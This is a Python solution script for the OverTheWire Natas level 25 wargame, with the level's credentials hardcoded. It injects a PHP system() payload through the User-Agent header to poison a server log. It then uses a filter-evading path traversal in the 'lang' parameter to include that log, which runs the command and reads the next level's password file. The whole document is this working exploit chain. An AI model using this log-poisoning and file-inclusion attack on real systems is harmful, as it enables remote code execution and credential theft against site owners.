import requests, re
u='natas25'
p='GHF6X7YwACaYYssHVY05cFq83hRktl4c'
l=f'http://{u}.natas.labs.overthewire.org/'
sess=requests.Session()
headers={'User-Agent':"<?php system('cat /etc/natas_webpass/natas26')?>"}
resp=sess.get(l,auth=(u, p))
sid=resp.cookies['PHPSESSID']
resp=sess.post(l,auth=(u, p),headers=headers,data={'lang':'..././..././..././..././..././var/www/natas/natas25/logs/natas25_'+sid+'.log'})
print(resp.text)
